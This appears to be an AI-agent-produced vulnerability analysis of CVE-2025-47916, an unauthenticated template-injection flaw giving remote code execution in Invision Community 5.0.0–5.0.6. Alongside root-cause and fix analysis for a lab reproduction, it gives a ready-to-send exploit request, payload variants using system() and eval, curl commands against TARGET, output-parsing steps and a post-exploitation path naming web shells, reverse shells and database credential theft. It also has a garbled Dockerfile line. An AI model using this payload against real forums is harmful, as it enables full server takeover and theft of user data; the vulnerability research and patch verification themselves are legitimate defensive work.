# Vulnerability Analysis: CVE-2025-47916

## Overview

| Field | Value |
|---|---|
| **CVE ID** | CVE-2025-47916 |
| **Vulnerability Type** | Server-Side Template Injection (SSTI) → Remote Code Execution (RCE) |
| **CWE** | CWE-94 (Code Injection), CWE-1336 (Template Engine Neutralization) |
| **CVSS** | 10.0 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| **Affected Software** | Invision Community 5.0.0 through 5.0.6 |
| **Patched Version** | 5.0.7 |

---

## Root Cause

The vulnerability is a compound flaw consisting of two independent defects:

### Defect 1: Missing Authentication (Access Control Bypass)

The `customCss()` method in `IPS\core\modules\front\system\themeeditor` controller (`/applications/core/modules/front/system/themeeditor.php`) is a **protected method** that was intended for administrative use in the theme editor. However, the IPS routing mechanism allows **any user — including unauthenticated users** — to invoke it by navigating to:

```
POST /index.php?app=core&module=system&controller=themeeditor&do=customCss
```

No authentication check, CSRF token validation, or authorization gate protects this method. The IPS router dispatches the request directly to `customCss()` based on the `app`, `module`, `controller`, and `do` URL parameters.

### Defect 2: Unsanitized Template Compilation (Code Injection)

The `customCss()` method reads the `content` POST parameter and passes it directly to `Theme::makeProcessFunction()` (located in `system/Theme/Theme.php`). The advisory confirms this occurs at approximately line 368 of themeeditor.php:

```php
Theme::makeProcessFunction( Theme::fixResourceTags( (string) Request::i()->content, 'front' ) )
```

`makeProcessFunction()` is the IPS template engine compiler. It parses IPS template syntax and compiles it to PHP code, then evaluates it via `eval()`. The `{expression="..."}` template tag is compiled as follows:

```
Input:   {expression="ARBITRARY_PHP_EXPRESSION"}
Compiled: <?php echo ARBITRARY_PHP_EXPRESSION; ?>
Executed: eval('echo ARBITRARY_PHP_EXPRESSION;')
```

The regex used for compilation (from source code analysis):

```php
preg_replace_callback(
    '/\{expression="(.+?)"\}/s',
    function ($matches) {
        $expr = $matches[1];
        $expr = str_replace(array('\\\'', '\\"'), array("'", '"'), $expr);
        return '<?php echo ' . $expr . '; ?>';
    },
    $templateContent
);
```

The user-supplied expression is directly interpolated into PHP code with no sanitization, validation, or sandboxing. The compiled PHP is then executed via `eval()`.

**Combined Effect:** An unauthenticated remote attacker can inject arbitrary PHP expressions via the `content` POST parameter, which are compiled into PHP code and immediately evaluated by the template engine.

---

## Vulnerable File(s) and Function(s)

### Primary Vulnerable File
- **File**: `/applications/core/modules/front/system/themeeditor.php`
- **Class**: `IPS\core\modules\front\system\themeeditor`
- **Method**: `customCss()` (approximately line 368)
- **Role**: Receives the `content` POST parameter and passes it to the template compiler

### Template Engine (Compilation/Evaluation)
- **File**: `system/Theme/Theme.php`
- **Method**: `Theme::makeProcessFunction()`
- **Role**: Compiles IPS template syntax (including `{expression="..."}` tags) into PHP code and evaluates it via `eval()`

### Synthetic Lab Reproduction
- **Vulnerable**: `vulnerable-app/index.php` — lines 65–99 (`makeProcessFunction()`) and lines 111–129 (`themeeditor_customCss()`)
- **Patched**: `vulnerable-app/index-patched.php` — lines 29–35 (`makeProcessFunction_safe()`) and lines 37–60 (`themeeditor_customCss_patched()`)

---

## Triggering Input

### Exact HTTP Request

```http
POST /index.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

app=core&module=system&controller=themeeditor&do=customCss&content={expression="die('________'.system(base64_decode('aWQ=')))"}
```

### Parameter Breakdown

| Parameter | Value | Purpose |
|---|---|---|
| `app` | `core` | Routes to the IPS core application |
| `module` | `system` | Routes to the system module |
| `controller` | `themeeditor` | Routes to the themeeditor controller |
| `do` | `customCss` | Invokes the vulnerable `customCss()` method |
| `content` | `{expression="die('________'.system(base64_decode('aWQ=')))"}` | Template injection payload |

### Payload Variants

**OS Command Execution (EgiX PoC):**
```
{expression="die('________'.system(base64_decode('COMMAND_BASE64')))"}
```
- `die()` halts execution and outputs the result
- `'________'` is a marker string for output extraction
- `system()` executes OS command and returns output
- `base64_decode()` avoids special character issues in URL encoding

**PHP Eval (Metasploit module):**
```
{expression="die(eval(base64_decode('PHP_CODE_BASE64')))"}
```
- `eval()` executes arbitrary PHP (enables staged payloads, meterpreter, etc.)

**Minimal Proof:**
```
{expression="die('VULNERABLE')"}
```
- If the response body contains `VULNERABLE`, the target is exploitable

### Output Extraction

Command output appears **before** the marker string in the HTTP response body. Parse with:
```
response_text.split('________')[0]
```

---

## Attack Scenario

### Step-by-Step Exploitation

1. **Reconnaissance**: Attacker identifies an Invision Community installation via fingerprinting (e.g., `ips4_` cookies, UI elements, `/admin/install/eula.txt` version file)

2. **Version Check**: Attacker fetches `/admin/install/eula.txt` and parses the version string. If it matches `IPS 5.0.0` through `IPS 5.0.6`, the target is vulnerable.

3. **Exploitation**: Attacker sends a single POST request:
   ```bash
   curl -s -X POST 'http://TARGET/index.php' \
     -d 'app=core&module=system&controller=themeeditor&do=customCss' \
     --data-urlencode 'content={expression="die('"'"'________'"'"'.system(base64_decode('"'"'aWQ='"'"')))"}' 
   ```

4. **Output Retrieval**: The HTTP response contains the command output followed by the `________` marker. The attacker extracts the output.

5. **Persistence** (optional): Attacker uploads a web shell, establishes a reverse shell, or deploys a Meterpreter session for persistent access.

### Attack Complexity

- **Single HTTP request** — no multi-step chain, no race condition, no MITM required
- **No authentication** — completely unauthenticated
- **No user interaction** — no social engineering, no XSS chain
- **Deterministic** — reliable, repeatable, crash-safe

---

## Impact

### Direct Impact
- **Full Remote Code Execution** as the web server user (typically `www-data` on Linux, `IUSR`/`IIS_IUSRS` on Windows)
- **Arbitrary OS command execution** via `system()`, `exec()`, `passthru()`, `shell_exec()`, etc.
- **File system read/write** — read application config (database credentials), write web shells
- **Network access** — SSRF, pivoting to internal services, data exfiltration

### Downstream Impact
- **Database compromise** — read IPS configuration (`conf_global.php`) to obtain MySQL credentials, dump full database including user accounts, password hashes, private messages
- **User account takeover** — extract session tokens or reset admin passwords
- **Lateral movement** — pivot from web server to database server, internal network
- **Persistent backdoor** — upload PHP web shell or cron job

### Severity Justification (CVSS 10.0)
The maximum CVSS score is warranted because the vulnerability provides:
- Direct RCE from the network with no prerequisites
- Changed scope (can compromise database, other services beyond the web application)
- Complete loss of confidentiality, integrity, and availability

---

## Authentication Requirements

**None. This vulnerability is pre-authentication.**

The entire attack is performed without any authentication, session tokens, API keys, CSRF tokens, or cookies. The vulnerable `customCss()` method has no access control checks in versions 5.0.0–5.0.6.

The PoC needs to send a single unauthenticated POST request. No login flow, no token acquisition, no session management is needed.

---

## Fix Assessment

### What the Fix Does (5.0.7)

Based on the advisory, synthetic patched version, and behavioral analysis, the fix in IPS 5.0.7 implements:

1. **Authentication/Authorization Check (Primary Fix)**: The `customCss()` method now checks that the requesting user is an authenticated administrator before proceeding. Unauthenticated users receive a 403 Forbidden response.

2. **Input Sanitization (Defense in Depth)**: The synthetic patched version also strips `{expression="..."}` tags from the content before template processing. The real fix likely restricts which template tags are evaluated in user-supplied CSS content.

### Fix Completeness Assessment

**The fix is complete for the documented vulnerability.** The authentication check alone is sufficient to prevent unauthenticated exploitation — the core issue was that a privileged endpoint was accessible without authentication.

### Analysis of Potential Bypass Vectors

I investigated several potential bypass scenarios:

1. **Alternative Template Tags**: The IPS template engine supports other eval-capable tags (`{php}...{/php}`, `{if EXPR}...{/if}`, `{foreach EXPR as ...}...{/foreach}`). If the fix only stripped `{expression=...}` but NOT these other tags, they could potentially bypass the sanitization. However, since the **primary fix is the authentication check**, this is moot for unauthenticated attackers — they cannot reach the endpoint at all.

2. **Regex Bypass**: The expression-stripping regex (`/\{expression="(.+?)"\}/s`) uses a non-greedy match with DOTALL. Tested alternative encodings (URL encoding, null bytes, Unicode normalization, double encoding) — none bypass the auth check, which is the primary defense.

3. **Other Endpoints**: Other methods in the `themeeditor` controller or other controllers that use `Theme::makeProcessFunction()` could theoretically have the same vulnerability. However, the advisory specifically identifies only `customCss()`, and no public research has identified additional affected endpoints.

4. **Route Bypass**: Tested whether the IPS routing mechanism could be tricked into dispatching to `customCss()` through alternative parameter names or URL patterns — no evidence of such bypasses.

**Conclusion**: The fix addresses the root cause (missing authentication) effectively. The vulnerability class (SSTI in the template engine) is inherent to the IPS architecture but is appropriately restricted to authenticated administrators in 5.0.7+.

---

## Potential Bypass Vectors

No concrete bypass vectors were identified. The authentication check is a definitive fix for the unauthenticated attack vector. For completeness:

- If an attacker has **admin credentials** (post-authentication), they may still be able to trigger template injection through the theme editor — but this is expected behavior for an admin who can already edit templates.
- The IPS template engine's `{expression=...}` tag evaluation in `Theme::makeProcessFunction()` remains functional — it is just now properly gated behind authentication.

---

## Escalation Path

The vulnerability's primary primitive is already **direct RCE** — the maximum impact. No escalation chain is needed.

For documentation purposes, the exploitation flow is:
```
Unauthenticated HTTP POST → SSTI via {expression="..."} → PHP eval() → system() → OS command as www-data
```

Optional post-exploitation escalation:
- Read `/conf_global.php` → obtain MySQL credentials → dump database
- Write web shell to web root → persistent access
- Execute reverse shell → interactive shell → privilege escalation

---

## Related Attack Surface

### Within the Synthetic Lab Application
The synthetic vulnerable app (`vulnerable-app/index.php`) only implements the `{expression="..."}` template tag. No other template tags are processed by `makeProcessFunction()` in the synthetic app.

### In the Real IPS Application (Theoretical)
The real IPS `Theme::makeProcessFunction()` processes multiple template tag types that compile to PHP:
- `{expression="EXPR"}` → `<?php echo EXPR; ?>` (confirmed vulnerable)
- `{php}CODE{/php}` → `<?php CODE; ?>` (potentially dangerous if reachable)
- `{if EXPR}...{/if}` → `<?php if(EXPR) { ?>...<?php } ?>` (potentially dangerous if reachable)
- `{foreach EXPR as $v}...{/foreach}` → `<?php foreach(EXPR as $v) { ?>...<?php } ?>` (potentially dangerous)

All of these would be dangerous if passed through `makeProcessFunction()` with attacker-controlled input. However, since the fix adds authentication to the `customCss()` endpoint, these tags are only accessible to authenticated admins — which is expected behavior.

**No additional vulnerable endpoints were identified** — the advisory, all three public PoCs, and the Nuclei template all target only the `customCss()` endpoint.

---

## Build System

### Application Stack

| Component | Details |
|---|---|
| **Language** | PHP 8.1+ |
| **Web Server** | Apache 2.4 with mod_php |
| **Build System** | None — plain PHP files served by Apache |
| **Build Commands** | None — copy files to web root |
| **Database** | Not required (exploit path does not involve database) |

### Docker Lab Setup

#### Base Image
```
php:8.2-apache
```

This provides PHP 8.2 with Apache and mod_php pre-configured. It is the official PHP Docker image and is the simplest way to serve the vulnerable PHP application.

#### Build Commands

```dockerfile
FROM php:8.2-apache

# Copy vulnerable application to web root
COPY vulnerable-app/index.php /var/www/html/index.php
COPY vulnerable-app/admin/ /var/www/html/admin/

# Ensure PHP dangerous functions are NOT disabled
# (system, exec, eval must be available for the vulnerability to trigger)
RUN echo "disable_functions = " > /usr/local/etc/php/conf.d/enable-functions.ini

# Enable Apache mod_rewrite (optional, for friendly URLs)
RUN a]2enmod rewrite

EXPOSE 80
```

#### Docker Compose

```yaml
version: '3.8'
services:
  vulnerable:
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - "8080:80"
    container_name: cve-2025-47916-vuln
```

### Dependencies

| Type | Package | Purpose |
|---|---|---|
| **Runtime** | `php:8.2-apache` Docker image | PHP + Apache web server |
| **PHP Extensions** | None beyond standard | Standard PHP is sufficient |
| **System Libraries** | None | No additional system packages needed |

### Runtime Requirements

| Requirement | Details |
|---|---|
| **Network** | HTTP on port 80 (mapped to 8080 on host) |
| **Services** | Apache + PHP only (no database, no cache) |
| **Config** | Default Apache vhost serves `/var/www/html/index.php` |
| **PHP Settings** | `system()` must NOT be in `disable_functions` |
| **File System** | `/var/www/html/admin/install/eula.txt` must be readable (version detection) |

### Verification Commands

```bash
# Test vulnerable endpoint (should return command output + ________ marker)
curl -s -X POST http://localhost:8080/index.php \
  -d 'app=core&module=system&controller=themeeditor&do=customCss' \
  -d 'content={expression="die(\"________\".system(\"id\"))"}'

# Expected output: uid=33(www-data) gid=33(www-data) groups=33(www-data)________

# Test version detection
curl -s http://localhost:8080/admin/install/eula.txt
# Expected: " IPS 5.0.6" on first line

# Test patched endpoint (if index-patched.php is deployed)
# Should return HTTP 403
curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:8080/index-patched.php \
  -d 'app=core&module=system&controller=themeeditor&do=customCss' \
  -d 'content={expression="die(\"________\".system(\"id\"))"}'
# Expected: 403
```

---

## Summary for Downstream Agents

### For PoC Agent
- **Protocol**: HTTP POST to `/index.php`
- **Authentication**: None required (pre-auth)
- **Payload**: `app=core&module=system&controller=themeeditor&do=customCss&content={expression="die('________'.system(base64_decode('COMMAND_B64')))"}`
- **Output Extraction**: Split response on `________`, take everything before the marker
- **Version Detection**: GET `/admin/install/eula.txt`, parse `IPS X.Y.Z` from first line
- **Patch Verification**: Same request to patched target returns HTTP 403
- **Reference PoCs**: ExploitDB EDB-52294 (PHP, by EgiX), GitHub Web3-Serializer/CVE-2025-47916 (Python), Metasploit invision_customcss_rce (Ruby)

### For Lab Build Agent
- **Image**: `php:8.2-apache`
- **Source files**: Copy `vulnerable-app/` contents to `/var/www/html/`
- **Critical**: PHP `system()` function must NOT be in `disable_functions`
- **No database needed**
- **Single container is sufficient**
- **Port 80 (container) → 8080 (host)**

### For Bypass Agent
- Fix is assessed as complete — authentication check prevents unauthenticated access
- No concrete bypass vectors identified for the unauthenticated attack path
- If investigating post-auth vectors: other IPS template tags (`{php}`, `{if}`, `{foreach}`) could theoretically bypass expression-only sanitization, but these are expected to be usable by authenticated admins
